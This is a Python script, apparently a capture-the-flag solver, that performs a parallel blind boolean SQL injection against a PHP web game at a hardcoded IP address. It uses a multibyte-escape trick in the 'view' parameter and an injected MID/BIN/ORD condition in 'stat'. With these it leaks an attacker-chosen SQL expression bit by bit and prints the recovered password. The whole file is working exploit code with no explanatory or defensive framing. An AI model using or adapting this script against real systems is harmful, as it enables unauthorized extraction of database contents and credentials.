#!/usr/bin/env python3
import urllib.request
import urllib.parse
import http.cookiejar
import sys
import re
from bs4 import BeautifulSoup

jar = http.cookiejar.CookieJar()
handler = urllib.request.HTTPCookieProcessor(jar)
opener = urllib.request.build_opener(handler)
urllib.request.install_opener(opener)
urllib.request.urlopen("http://61.42.25.28/Webgameeeeeeeee/index.php?mode=join").read()

def get_bit(cnum, bnum, func):
	site="http://61.42.25.28/Webgameeeeeeeee/index.php"
	order=str.format("OR ip=0x3133302e3232352e3130332e323034 AND MID(LPAD(BIN(ORD(MID({2},{0},1))),8,0),{1},1) -- ", cnum+1, bnum+1, func)
	#print(order)
	getstr=site+'?view=%E0\\&stat='+urllib.parse.quote_plus(order)
	#print(getstr)
	response = urllib.request.urlopen(getstr).read()
	#print(response)
	return b'Warrior' in response

#def mk_replace(s):
#	for i in range(32, 127):
#		s = str.format(r"replace({0},'\x{1:2x}','{1:2x}')", s, i)
#	return s

from multiprocessing import Process, Pipe

def bit_body(conn, cnum, bnum):
	bit = get_bit(cnum,bnum,sys.argv[1])
	conn.send(str(int(bit)))

if __name__ == '__main__':
	pw=''
	for cnum in range(100):
		byte = ''
		processes = []
		for bnum in range(8):
			pconn, cconn = Pipe()
			p = Process(target=bit_body, args=(cconn,cnum,bnum))
			processes.append((p, pconn))
			p.start()
		for p, pconn in processes:
			bit = pconn.recv()
			#print("cnum={0}, bnum={1}, bit={2}", cnum, bnum, bit)
			p.join()
			byte += bit
		if int(byte, 2) == 0:
			break
		pw += chr(int(byte, 2))
		print("cnum={0}", cnum)
		print("pw=" + pw)
#print(mk_replace("!"))
